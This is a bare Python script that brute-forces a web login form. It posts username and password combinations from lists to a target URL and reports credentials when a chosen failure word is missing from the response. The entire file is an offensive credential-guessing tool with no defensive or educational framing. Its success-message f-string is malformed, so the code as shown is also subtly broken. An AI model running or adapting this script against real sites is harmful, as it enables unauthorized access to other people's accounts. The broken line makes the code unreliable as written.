import requests

def try_login (username, password, target, fail_word):
    try:
        response = requests.post(target, data={"user": username, "pass": password})
        if fail_word not in response.text:
            print(f"{[✅] FOUND! Username: {username} Password: {password}}")
            return True
        else:
            print(f"[-] Tried: {username}:{password}")
            return False
    except requests.RequestException as e:
        print(f"[!] Request failed for {username}: {password} -> {e}")
        return False

def login(username, password, target, fail_word):
    print("[*] Trying single combination...")
    try_login(username, password, target, fail_word)
    
def brute_force_list(usernames, passwords, target, fail_word):
    print(f"[*] Starting brute force on {target}")
    for user in usernames:
        for pwd in passwords:
            if try_login(user.strip(), pwd.strip(), target, fail_word):
                return